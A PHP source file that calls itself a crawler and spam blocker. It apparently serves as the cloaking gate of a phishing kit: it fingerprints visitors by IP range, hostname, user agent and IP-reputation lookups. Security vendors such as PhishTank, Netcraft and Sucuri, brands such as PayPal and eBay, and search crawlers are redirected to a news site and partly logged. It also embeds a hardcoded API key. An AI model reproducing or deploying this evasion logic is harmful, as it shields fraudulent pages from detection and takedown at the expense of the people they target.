<!-- 
    Block Httrack / Spammers / Crawlers / Vacuum cleaners
 -->
<?php

    $redirect = "https://www.lemonde.fr/";
    $apiabuse = "e5af7d641f2e6ffecf1da9e8c8586f8f6c0856904685212cb40c47d2aa9bb635bcdefa757d2a486f";

    $UA = $_SERVER["HTTP_USER_AGENT"];

    function GetIP() {
        $ipaddress = '';
        if (getenv('HTTP_CLIENT_IP'))
            $ipaddress = getenv('HTTP_CLIENT_IP');
        else if(getenv('HTTP_X_FORWARDED_FOR'))
            $ipaddress = getenv('HTTP_X_FORWARDED_FOR');
        else if(getenv('HTTP_X_FORWARDED'))
            $ipaddress = getenv('HTTP_X_FORWARDED');
        else if(getenv('HTTP_FORWARDED_FOR'))
            $ipaddress = getenv('HTTP_FORWARDED_FOR');
        else if(getenv('HTTP_FORWARDED'))
            $ipaddress = getenv('HTTP_FORWARDED');
        else if(getenv('REMOTE_ADDR'))
            $ipaddress = getenv('REMOTE_ADDR');
        else
            $ipaddress = 'UNKNOWN';
        
        return $ipaddress;
    }

    $HN = gethostbyaddr(GetIP());

    function GetURL() {
        $url = 'http';
        if ($_SERVER["HTTPS"] == "on") {$url .= "s";}
            $url .= "://";
        if ($_SERVER["SERVER_PORT"] != "80") {
            $url .= $_SERVER["SERVER_NAME"].":".$_SERVER["SERVER_PORT"].$_SERVER["REQUEST_URI"];
        } else {
            $url .= $_SERVER["SERVER_NAME"].$_SERVER["REQUEST_URI"];
        }
        return $url;
    }

    // $bips = array("^66.102.*.*","^38.100.*.*","^185.187.*.*","^185.187.30.*","^107.170.*.*","^149.20.*.*","^38.105.*.*","^173.239.*.*","^173.244.36.*","^74.125.*.*","^66.150.14.*","^54.176.*.*","^38.100.*.*","^184.173.*.*","^66.249.*.*","^128.242.*.*","^72.14.192.*","^208.65.144.*","^74.125.*.*","^209.85.128.*","^216.239.32.*","^74.125.*.*","^207.126.144.*","^173.194.*.*","^64.233.160.*","^72.14.192.*","^66.102.*.*","^64.18.*.*","^194.52.68.*","^194.72.238.*","^62.116.207.*","^212.50.193.*","^69.65.*.*","^50.7.*.*","^131.212.*.*","^46.116.*.* ","^62.90.*.*","^89.138.*.*","^82.166.*.*","^85.64.*.*","^85.250.*.*","^89.138.*.*","^93.172.*.*","^109.186.*.*","^194.90.*.*","^212.29.192.*","^212.29.224.*","^212.143.*.*","^212.150.*.*","^212.235.*.*","^217.132.*.*","^50.97.*.*","^217.132.*.*","^209.85.*.*","^66.205.64.*","^204.14.48.*","^64.27.2.*","^67.15.*.*","^202.108.252.*","^193.47.80.*","^64.62.136.*","^66.221.*.*","^64.62.175.*","^198.54.*.*","^192.115.134.*","^216.252.167.*","^193.253.199.*","^69.61.12.*","^64.37.103.*","^38.144.36.*","^64.124.14.*","^206.28.72.*","^209.73.228.*","^158.108.*.*","^168.188.*.*","^66.207.120.*","^167.24.*.*","^192.118.48.*","^67.209.128.*","^12.148.209.*","^12.148.196.*","^193.220.178.*","68.65.53.71","^198.25.*.*","^64.106.213.*","173.239.240.147","103.248.172.42","69.25.58.61","185.187.30.13","178.24.121.188","87.113.96.90","165.227.0.128","185.229.190.140", "165.227.0.128", "46.101.94.163", "165.227.39.194","87.113.96.90","46.101.119.24","82.102.27.75", "173.239.230.97", "82.102.27.75", "87.113.96.90", "46.101.119.24", "173.239.230.97", "87.113.96.90", "87.113.96.90", "159.203.0.156", "162.243.187.126","82.102.27.75", "87.113.96.90","103.248.172.42", "103.248.172.42", "47.30.133.89", "103.248.172.42");
    // if(in_array(GetIP(), $bips)) {
    //     header('Location: ' . $redirect); die();
    // } else {
    //     foreach($bips as $ip) { 
    //         if(preg_match('/'.$ip.'/',$ip)) {
    //             header('Location: ' . $redirect); die();
    //         }
    //     }
    // }

    $bips2 = array("drweb","hostinger","scanurl","above","google","Dr.Web","facebook","softlayer","amazonaws","cyveillance","dreamhost","netpilot","calyxinstitute","tor-exit","phishtank","msnbot","p3pwgdsn","netcraft","trendmicro","ebay","paypal","torservers","messagelabs","sucuri.net","crawler");
    foreach($bips2 as $ip) {
        if(substr_count($HN,$ip) > 0) {
            header('Location: ' . $redirect); die();
        }
    }

    if(!empty($UA)) {
        $agents = array("Google","Slurp","MSNBot","ia_archiver","Yandex","Rambler");
        
        foreach($agents as $agent) {
            if(strpos($UA, $agent) !== false) {
                header('Location: ' . $redirect); die();
            }
        }
    }

    $bnd_ips = array("^81.161.59.*","^66.135.200.*","^66.102.*.*","^38.100.*.*","^107.170.*.*","^149.20.*.*","^38.105.*.*","^74.125.*.*","^66.150.14.*","^54.176.*.*","^38.100.*.*","^184.173.*.*","^66.249.*.*","^128.242.*.*","^72.14.192.*","^208.65.144.*","^74.125.*.*","^209.85.128.*","^216.239.32.*","^74.125.*.*","^207.126.144.*","^173.194.*.*","^64.233.160.*","^72.14.192.*","^66.102.*.*","^64.18.*.*","^194.52.68.*","^194.72.238.*","^62.116.207.*","^212.50.193.*","^69.65.*.*","^50.7.*.*","^131.212.*.*","^46.116.*.* ","^62.90.*.*","^89.138.*.*","^82.166.*.*","^85.64.*.*","^85.250.*.*","^89.138.*.*","^93.172.*.*","^109.186.*.*","^194.90.*.*","^212.29.192.*","^212.29.224.*","^212.143.*.*","^212.150.*.*","^212.235.*.*","^217.132.*.*","^50.97.*.*","^217.132.*.*","^209.85.*.*","^66.205.64.*","^204.14.48.*","^64.27.2.*","^67.15.*.*","^202.108.252.*","^193.47.80.*","^64.62.136.*","^66.221.*.*","^64.62.175.*","^198.54.*.*","^192.115.134.*","^216.252.167.*","^193.253.199.*","^69.61.12.*","^64.37.103.*","^38.144.36.*","^64.124.14.*","^206.28.72.*","^209.73.228.*","^158.108.*.*","^168.188.*.*","^66.207.120.*","^167.24.*.*","^192.118.48.*","^67.209.128.*","^12.148.209.*","^12.148.196.*","^193.220.178.*","68.65.53.71","^198.25.*.*","^64.106.213.*","^91.103.66.*","^208.91.115.*","^199.30.228.*");
    if(in_array(GetIP(),$bnd_ips)) { 
        header('Location: ' . $redirect); die();
    } else {
        foreach($bnd_ips as $bnd_ip) {
            if(preg_match('/'.$bnd_ip.'/',GetIP())) { 
                header('Location: ' . $redirect); die();
            }
        }
    }

    $adr_ip = GetIP();
    $bnd_ips = array("^94.26.*.*","^95.85.*.*","^72.52.96.*","^212.8.79.*","^62.99.77.*","^83.31.118.*","^91.231.*.*","^206.207.*.*","^91.231.212.*","^62.99.77.*","^198.41.243.*","^162.158.*.*","^162.158.7.*","^162.158.72.*","^173.245.55.*","^108.162.246.*","^162.158.95.*","^108.162.215.*","^95.108.194.*","^141.101.104.*","^93.54.82.*","^69.164.145.*","^194.153.113.*","^178.43.117.*","^62.141.65.*","^83.31.69.*","^107.178.195.*","^149.20.54.*","^85.9.7.*","^87.106.251.*","^107.178.194.*","^124.66.185.*","^133.11.204.*","^185.2.138.*","^188.165.83.*","^78.148.13.*","^192.232.213.*","^1.234.41.*","^124.66.185.*","^87.106.251.*","^176.195.231.*","^206.253.226.*","^107.20.181.*","^188.244.39.*","^124.66.185.*","^38.74.138.*","^124.66.185.*","^38.74.138.*","^206.253.226.*","^1.234.41.*","^124.66.185.*","^87.106.251.*","^85.9.7.*","^37.140.188.*","^195.128.227.*","^38.74.138.*","^107.20.181.*","^104.131.223.*","^46.4.120.*","^107.178.194.*","^198.60.236.*","^217.74.103.*","^92.103.69.*","^217.74.103.*","^66.211.160.86*","^46.244.*.*","^131.*.*.*","^157.*.*.*","^202.*.*.*","^204.*.*.*","^207.*.*.*","^213.*.*.*","^219.*.*.*","^63.*.*.*","^64.*.*.*","^65.*.*.*","^68.*.*.*","^64.*.*.*","^64.233.160.*","^64.233.191.*","^64.233.191.255*","^66.102.*.*","^66.249.*.*","^72.14.*.*","^74.125.*.*","^209.85.*.*","^216.239.*.*","^64.4.*.*","^65.52.*.*","^131.253.*.*","^157.54.*.*","^207.46.*.*","^207.68.*.*","^8.12.*.*","^66.196.*.*","^66.228.*.*","^67.195.*.*","^68.142.*.*","^72.30.*.*","^74.6.*.*","^98.136.*.*","^202.160.*.*","^209.191.*.*","^66.102.*.*","^38.100.*.*","^107.170.*.*","^149.20.*.*","^38.105.*.*","^74.125.*.*","^66.150.14.*","^54.176.*.*","^38.100.*.*","^184.173.*.*","^66.249.*.*","^128.242.*.*","^72.14.192.*","^208.65.144.*","^74.125.*.*","^209.85.128.*","^216.239.32.*","^74.125.*.*","^207.126.144.*","^173.194.*.*","^64.233.160.*","^72.14.192.*","^66.102.*.*","^64.18.*.*","^194.52.68.*","^194.72.238.*","^62.116.207.*","^212.50.193.*","^69.65.*.*","^50.7.*.*","^131.212.*.*","^46.116.*.* ","^62.90.*.*","^89.138.*.*","^82.166.*.*","^85.64.*.*","^85.250.*.*","^89.138.*.*","^93.172.*.*","^109.186.*.*","^194.90.*.*","^212.29.192.*","^212.29.224.*","^212.143.*.*","^212.150.*.*","^212.235.*.*","^217.132.*.*","^50.97.*.*","^217.132.*.*","^209.85.*.*","^66.205.64.*","^204.14.48.*","^64.27.2.*","^67.15.*.*","^202.108.252.*","^193.47.80.*","^64.62.136.*","^66.221.*.*","^64.62.175.*","^198.54.*.*","^192.115.134.*","^216.252.167.*","^193.253.199.*","^69.61.12.*","^64.37.103.*","^38.144.36.*","^64.124.14.*","^206.28.72.*","^209.73.228.*","^158.108.*.*","^168.188.*.*","^66.207.120.*","^167.24.*.*","^192.118.48.*","^67.209.128.*","^12.148.209.*","^12.148.196.*","^193.220.178.*","68.65.53.71","^198.25.*.*","^64.106.213.*",);
    foreach($bnd_ips as $bnd_ip){
        if(preg_match('/'.$bnd_ip.'/',$adr_ip)){
            $file = fopen("captured.txt","a+");
            fwrite($file, "ip : {$bnd_ip} | " . date('d/m/Y h:i:sa') . "\n\n");
            fclose($file);
            echo"<br>";
            header('Location: ' . $redirect); die();
        }
    }
    $lower_ua = strtolower($UA);
    $bnd_uas = array("bot","above","google","softlayer","amazonaws","cyveillance","phishtank","dreamhost","netpilot","calyxinstitute","tor-exit","apache-httpclient","lssrocketcrawler","crawler","urlredirectresolver","jetbrains","spam","windows 95","windows 98","acunetix","netsparker","007ac9","008","192.comagent","200pleasebot","360spider","4seohuntbot","50.nu","a6-indexer","admantx","amznkassocbot","aboundexbot","aboutusbot","abrave spider","accelobot","acoonbot","addthis.com","adsbot-google","ahrefsbot","alexabot","amagit.com","analytics","antbot","apercite","aportworm","EBAY","CL0NA","jabber","ebay","arabot","hotmail!","msn!","outlook!","outlook","msn","hotmail");
    foreach($bnd_uas as $bnd_ua){
        if(substr_count($lower_ua,strtolower($bnd_ua)) > 0 or $lower_ua == "" or $lower_ua == " " or $lower_ua == "	") {
            $file = fopen("captured.txt","a+");
            fwrite($file,"ip : {$adr_ip} | " . date('d/m/Y h:i:sa') . "\n\n");
            fclose($file);
            echo"<br>";
            header('Location: ' . $redirect); die();
        }
    }

    $bannav = Array(
        'HTTrack', 'SiteSucker', 'Ezooms', 'EasouSpider', 'Baiduspider', 'AhrefsBot', 'HTTPClient', 'hors ligne', 'httpdown', 'Offline', 'PageGrabber', 'SiteSnagger',
        'Teleport', 'WebCapture', 'WebCopier', 'webcopy', 'WebMirror', 'WebReaper', 'WebZIP', 'Alexibot', 'Aqua_Products', 'asterias', 'b2w', 'BackDoor', 'BackWeb', 'BackStreet',
        'Bandit', 'BatchFTP', 'Black.Hole', 'BlackWidow', 'BlowFish', 'BotALot', 'BotRightHere', 'BuiltBotTough', 'Bullseye', 'bumblebee', 'BunnySlippers', 'capture', 'Cegbfeieh',
        'CheeseBot', 'CherryPicker', 'CherryPickrElite', 'CherryPickerSE', 'ChinaClaw', 'clipping', 'clsHTTP', 'collage', 'Copernic', 'Copier', 'CopyRightCheck', 'Cosmos',
        'Crescent', 'Custo', 'DA ', 'Demon', 'Density', 'Disco', 'disco', 'DISCoFinder', 'DittoSpyder', 'Download', 'eCatch', 'EirGrabber', 'Email', 'email', 'EmeraldShield',
        'emporter', 'EroCrawler', 'Extractor', 'EyeNetIE', 'FairAd', 'Filangy', 'Flaming', 'FlashGet', 'FlickBot', 'Foobot', 'FrontPage', 'Gaisbot', 'GetRight', 'GetSmart',
        'GetWeb', 'GetWebPage', 'gigabaz', 'Go-Ahead', 'Go!Zilla', 'GornKer', 'gotit', 'Grabber', 'GrabNet', 'Grafula', 'Hari', 'Harvest', 'hloader', 'HMSE_Robot', 'HMView',
        'httplib', 'humanlinks', 'Indy', 'InfoNaviRobot', 'Iron', 'InterGET', 'Intraformant', 'Jenny', 'Jetcar', 'JOC', 'JustView', 'kapere', 'Kenjin', 'larbin', 'LeechFTP',
        'LexiBot', 'LibWeb', 'LinkScan', 'LinkextractorPro', 'LinkWalker', 'LNSpiderguy', 'loader', 'lwp-trivial', 'Microsoft.URL', 'Microsoft URL', 'Missigua', 'Mister PiX',
        'Mata', 'MIDown', 'MIIxpc', 'MJ12bot', 'moget', 'NetAnts', 'NetMechanic', 'Navroad', 'NearSite', 'NetAttache', 'NetMechanic', 'NetSpider', 'NetZIP', 'NICErsPRO',
        'Ninja', 'NPBot', 'Octopus', 'Offline', 'Openbot', 'Openfind', 'Oracle', 'PageGrabber', 'Papa', 'pavuk', 'pcBrowser', 'PerMan', 'PersonaPilot', 'PingALink',
        'ProPower', 'ProWeb', 'Python', 'PycURL', 'QuepasaCreep', 'QueryN', 'Quester', 'Radiation', 'RealDownload', 'Reaper', 'Recorder', 'ReGet', 'replacer', 'RepoMonkey',
        'RMA', 'SearchExpress', 'searchpreview', 'SiteSnagger', 'SlySearch', 'SmartDownload', 'snagger', 'Snake', 'spanner', 'SpankBot', 'Stripper', 'Sucker', 'SuperBot',
        'SuperHTTP', 'Surfbot', 'suzuran', 'Syntryx', 'Szukacz', 'Telesoft', 'TheNomad', 'TightTwatBot', 'Titan', 'toCrawl', 'True_Robot', 'turingos', 'TurnitinBot',
        'URL Control', 'URL de contrôle', 'UrlDispatcher', 'urllib', 'URL_Spider_Pro', 'URLy', 'Vampire', 'VCI', 'Veuve', 'VoidEYE', 'WebAuto', 'WebBandit', 'WebCapture',
        'Webclipping', 'webcollage', 'webcopy', 'WebEMail', 'WebEnhancer', 'WebFetch', 'webfetch', 'WebGo', 'Web Image', 'Web.Image', 'WebIndexer', 'WebLeacher', 'WebmasterWorld',
        'WebMiner', 'WebMirror', 'WebPictures', 'WebSauger', 'Website', 'Webster', 'WebStripper', 'Web Sucker', 'WebWalker', 'WebWhacker', 'WebZIP', 'Wget', 'WWW-Collector',
        'wwwoffle', 'Whacker', 'whizbang', 'Zeus', 'Python-urllib', 'ADSARobot', 'ah-ha', 'almaden', 'aktuelles', 'Anarchie', 'amzn_assoc', 'ASPSeek', 'ASSORT', 'ATHENS', 'Atomz',
        'attach', 'attache', 'autoemailspider', 'BackWeb', 'Bandit', 'BatchFTP', 'bdfetch', 'big.brother', 'BlackWidow', 'bmclient', 'Boston Project',
        'BravoBrian SpiderEngine MarcoPolo', 'Bot mailto:craftbot@yahoo.com', 'Buddy', 'Bullseye', 'bumblebee', 'capture', 'CherryPicker', 'ChinaClaw', 'CICC', 'clipping', 
        'Collector', 'Copier', 'Crescent', 'Crescent Internet ToolPak', 'Custo', 'cyberalert', 'DA$', 'Deweb', 'diagem', 'Digger', 'Digimarc', 'DIIbot', 'DISCo', 'DISCo Pump',
        'DISCoFinder', 'Download Demon', 'Download Wonder', 'Downloader', 'Drip', 'DSurf15a', 'DTS.Agent', 'EasyDL', 'eCatch', 'ecollector', 'efp@gmx\.net', 'Email Extractor', 
        'EirGrabber', 'email', 'EmailCollector', 'EmailSiphon', 'EmailWolf', 'Express WebPictures', 'ExtractorPro', 'EyeNetIE', 'FavOrg', 'fastlwspider', 'Favorites Sweeper', 
        'Fetch', 'FEZhead', 'FileHound', 'FlashGet WebWasher', 'FlickBot', 'fluffy', 'FrontPage', 'GalaxyBot', 'Generic', 'Getleft', 'GetRight', 'GetSmart', 'GetWeb!', 
        'GetWebPage', 'gigabaz', 'Girafabot', 'Go\!Zilla', 'Go!Zilla', 'Go-Ahead-Got-It', 'GornKer', 'gotit', 'Grabber', 'GrabNet', 'Grafula', 'Green Research', 'grub-client', 
        'Harvest', 'hhjhj@yahoo', 'hloader', 'HMView', 'HomePageSearch', 'http generic', 'HTTrack', 'httpdown', 'httrack', 'ia_archiver', 'IBM_Planetwide', 'Image Stripper', 
        'Image Sucker', 'imagefetch', 'IncyWincy', 'Indy*Library', 'Indy Library', 'informant', 'Ingelin', 'InterGET', 'Internet Ninja', 'InternetLinkagent', 'Internet Ninja', 
        'InternetSeer\.com', 'Iria', 'Irvine', 'JBH*agent', 'JetCar', 'JOC', 'JOC Web Spider', 'JustView', 'KWebGet', 'Lachesis', 'larbin', 'LeechFTP', 'LexiBot', 'lftp', 'libwww', 
        'likse', 'Link', 'Link*Sleuth', 'LINKS ARoMATIZED', 'LinkWalker', 'LWP', 'lwp-trivial', 'Mag-Net', 'Magnet', 'Mac Finder', 'Mag-Net', 'Mass Downloader', 'MCspider', 
        'Memo', 'Microsoft.URL', 'MIDown tool', 'Mirror', 'Missigua Locator', 'Mister PiX', 'MMMtoCrawl\/UrlDispatcherLLL', '^Mozilla$', 'Mozilla.*Indy', 'Mozilla.*NEWT', 
        'Mozilla*MSIECrawler', 'MS FrontPage*', 'MSFrontPage', 'MSIECrawler', 'MSProxy', 'multithreaddb', 'nationaldirectory', 'Navroad', 'NearSite', 'NetAnts', 'NetCarta', 
        'NetMechanic', 'netprospector', 'NetResearchServer', 'NetSpider', 'Net Vampire', 'NetZIP', 'NetZip Downloader', 'NetZippy', 'NEWT', 'NICErsPRO', 'Ninja', 'NPBot', 
        'Octopus', 'Offline Explorer', 'Offline Navigator', 'OpaL', 'Openfind', 'OpenTextSiteCrawler', 'OrangeBot', 'PageGrabber', 'Papa Foto', 'PackRat', 'pavuk', 'pcBrowser', 
        'PersonaPilot', 'Ping', 'PingALink', 'Pockey', 'Proxy', 'psbot', 'PSurf', 'puf', 'Pump', 'PushSite', 'QRVA', 'RealDownload', 'Reaper', 'Recorder', 'ReGet', 'replacer', 
        'RepoMonkey', 'Robozilla', 'Rover', 'RPT-HTTPClient', 'Rsync', 'Scooter', 'SearchExpress', 'searchhippo', 'searchterms\.it', 'Second Street Research', 'Seeker', 'Shai', 
        'Siphon', 'sitecheck', 'sitecheck.internetseer.com', 'SiteSnagger', 'SlySearch', 'SmartDownload', 'snagger', 'Snake', 'SpaceBison', 'Spegla', 'SpiderBot', 'sproose', 
        'SqWorm', 'Stripper', 'Sucker', 'SuperBot', 'SuperHTTP', 'Surfbot', 'SurfWalker', 'Szukacz', 'tAkeOut', 'tarspider', 'Teleport Pro', 'Templeton', 'TrueRobot', 
        'TV33_Mercator', 'UIowaCrawler', 'UtilMind', 'URLSpiderPro', 'URL_Spider_Pro', 'Vacuum', 'vagabondo', 'vayala', 'visibilitygap', 'VoidEYE', 'vspider', 'Web Downloader', 
        'w3mir', 'Web Data Extractor', 'Web Image Collector', 'Web Sucker', 'Wweb', 'WebAuto', 'WebBandit', 'web\.by\.mail', 'Webclipping', 'webcollage', 'webcollector', 
        'WebCopier', 'webcraft@bea', 'webdevil', 'webdownloader', 'Webdup', 'WebEMailExtrac', 'WebFetch', 'WebGo IS', 'WebHook', 'Webinator', 'WebLeacher', 'WEBMASTERS', 
        'WebMiner', 'WebMirror', 'webmole', 'WebReaper', 'WebSauger', 'Website', 'Website eXtractor', 'Website Quester', 'WebSnake', 'Webster', 'WebStripper', 'websucker', 
        'webvac', 'webwalk', 'webweasel', 'WebWhacker', 'WebZIP', 'Wget', 'Whacker', 'whizbang', 'WhosTalking', 'Widow', 'WISEbot', 'WWWOFFLE', 'x-Tractor', '^Xaldon WebSpider', 
        'WUMPUS', 'Xenu', 'XGET', 'Zeus.*Webster', 'Zeus [NC]'
    );

    foreach ($bannav as $banned) {
        if(strstr(strtolower($UA), strtolower($banned))) {
            echo "[Security] Our website is protected against theft and spam <br><br> [Information] : $UA<br>$hostname<br>" . GetIP(); die();
        }
    }

    $blocked_words = array("above", "google", "softlayer", "amazonaws", "cyveillance", "phishtank", "dreamhost", "netpilot", "calyxinstitute", "tor-exit","amazonaws","cyveillance","phishtank","dreamhost","netpilot","calyxinstitute","tor-exit", "msnbot","p3pwgdsn","netcraft","trendmicro", "ebay", "paypal", "torservers", "messagelabs", "sucuri.net", "crawler","above", "google", "softlayer", "amazonaws", "cyveillance", "phishtank", "dreamhost", "netpilot", "calyxinstitute", "tor-exit","bot","above","google","softlayer","amazonaws","cyveillance","phishtank","dreamhost","netpilot","calyxinstitute","tor-exit","apache-httpclient","lssrocketcrawler","crawler","urlredirectresolver","jetbrains","spam","acunetix","netsparker","007ac9","008","192.comagent","200pleasebot","360spider","4seohuntbot","50.nu","a6-indexer","admantx","amznkassocbot","aboundexbot","aboutusbot","abrave spider","accelobot","acoonbot","addthis.com","adsbot-google","ahrefsbot","alexabot","amagit.com","analytics","antbot","apercite","aportworm","EBAY","CL0NA","jabber","ebay","arabot","hotmail!","msn!","outlook!","outlook","msn","hotmail");
    $blockedbots = array("bot","above","google","softlayer","amazonaws","cyveillance","compatible","facebook","phishtank","dreamhost","netpilot","calyxinstitute","tor-exit","apache-httpclient","lssrocketcrawler","Trident","X11","crawler","urlredirectresolver","jetbrains","spam","acunetix","netsparker","google","007ac9","008","192.comagent","200pleasebot","360spider","4seohuntbot","50.nu","a6-indexer","admantx","amznkassocbot","aboundexbot","aboutusbot","abrave spider","accelobot","acoonbot","addthis.com","adsbot-google","ahrefsbot","alexabot","amagit.com","analytics","antbot","apercite","aportworm","arabot","crawl","slurp","spider","seek","accoona","acoon","adressendeutschland","ah-ha.com","ahoy","altavista","ananzi","anthill","appie","arachnophilia","arale","araneo","aranha","architext","aretha","arks","asterias","atlocal","atn","atomz","augurfind","backrub","bannana_bot","baypup","bdfetch","big brother","biglotron","bjaaland","blackwidow","blaiz","blog","blo.","bloodhound","boitho","booch","bradley","butterfly","calif","cassandra","ccubee","cfetch","charlotte","churl","cienciaficcion","cmc","collective","comagent","combine","computingsite","csci","curl","cusco","daumoa","deepindex","delorie","depspid","deweb","die blinde kuh","digger","ditto","dmoz","docomo","download express","dtaagent","dwcp","ebiness","ebingbong","e-collector","ejupiter","emacs-w3 search engine","esther","evliya celebi","ezresult","falcon","felix ide","ferret","fetchrover","fido","findlinks","fireball","fish search","fouineur","funnelweb","gazz","gcreep","genieknows","getterroboplus","geturl","glx","goforit","golem","grabber","grapnel","gralon","griffon","gromit","grub","gulliver","hamahakki","harvest","havindex","helix","heritrix","hku www octopus","homerweb","htdig","html index","html_analyzer","htmlgobble","hubater","hyper-decontextualizer","ia_archiver","ibm_planetwide","ichiro","iconsurf","iltrovatore","image.kapsi.net","imagelock","incywincy","indexer","infobee","informant","ingrid","inktomisearch.com","inspector web","intelliagent","internet shinchakubin","ip3000","iron33","israeli-search","ivia","jack","jakarta","javabee","jetbot","jumpstation","katipo","kdd-explorer","kilroy","knowledge","kototoi","kretrieve","labelgrabber","lachesis","larbin","legs","libwww","linkalarm","link validator","linkscan","lockon","lwp","lycos","magpie","mantraagent","mapoftheinternet","marvin/","mattie","mediafox","mediapartners","mercator","merzscope","microsoft url control","minirank","miva","mj12","mnogosearch","moget","monster","moose","motor","multitext","muncher","muscatferret","mwd.search","myweb","najdi","nameprotect","nationaldirectory","nazilla","ncsa beta","nec-meshexplorer","nederland.zoek","netcarta webmap engine","netmechanic","netresearchserver","netscoop","newscan-online","nhse","nokia6682/","nomad","noyona","nutch","nzexplorer","objectssearch","occam","omni","open text","openfind","openintelligencedata","orb search","osis-project","pack rat","pageboy","pagebull","page_verifier","panscient","parasite","partnersite","patric","pear.","pegasus","peregrinator","pgp key agent","phantom","phpdig","picosearch","piltdownman","pimptrain","pinpoint","pioneer","piranha","plumtreewebaccessor","pogodak","poirot","pompos","poppelsdorf","poppi","popular iconoclast","psycheclone","publisher","python","rambler","raven search","roach","road runner","roadhouse","robbie","robofox","robozilla","rules","salty","sbider","scooter","scoutjet","scrubby","search.","searchprocess","semanticdiscovery","senrigan","sg-scout","shai'hulud","shark","shopwiki","sidewinder","sift","silk","simmany","site searcher","site valet","sitetech-rover","skymob.com","sleek","smartwit","sna-","snappy","snooper","sohu","speedfind","sphere","sphider","spinner","spyder","steeler/","suke","suntek","supersnooper","surfnomore","sven","sygol","szukacz","tach black widow","tarantula","templeton","/teoma","t-h-u-n-d-e-r-s-t-o-n-e","theophrastus","titan","titin","tkwww","toutatis","t-rex","tutorgig","twiceler","twisted","ucsd","udmsearch","url check","updated","vagabondo","valkyrie","verticrawl","victoria","vision-search","volcano","voyager/","voyager-hc","w3c_validator","w3m2","w3mir","walker","wallpaper","wanderer","wauuu","wavefire","web core","web hopper","web wombat","webbandit",        "webcatcher","webcopy","webfoot","weblayers","weblinker","weblog monitor","webmirror","webmonkey","webquest","webreaper","websitepulse","websnarf","webstolperer","webvac","webwalk","webwatch","webwombat","webzinger","wget","whizbang","whowhere","wild ferret","worldlight","wwwc","wwwster","xenu","xift","xirq","yandex","yanga","yeti","yahoo!");

    foreach($blocked_words as $w) {
        if (substr_count(strtolower($UA), strtolower($w)) > 0 or strtolower($UA) == "" or strtolower($UA) == " " or strtolower($UA) == "	") {
            header('Location: ' . $redirect); die();
        } 
    }

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://www.projecthoneypot.org/ip_' . GetIP());
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5000);

    $result = curl_exec($ch);
    curl_close($ch);

    if(!str_contains(strtolower($result), strtolower("don't have data on this IP"))) {
        header('Location: ' . $redirect); die();
    }

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://api.abuseipdb.com/api/v2/check?ipAddress=' . GetIP() . "&maxAgeInDays=90&verbose");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        "Key: " . $apiabuse,
        "Accept: application/json",
        "Content-Type: application/x-www-form-urlencoded"
    ));

    $result = json_decode(curl_exec($ch), true);
    curl_close($ch);
    
    if($result["data"]["abuseConfidenceScore"] > 20 || $result["data"]["totalReports"] > 5 || $result["data"]["isWhitelisted"] == true) {
        header('Location: ' . $redirect); die();
    }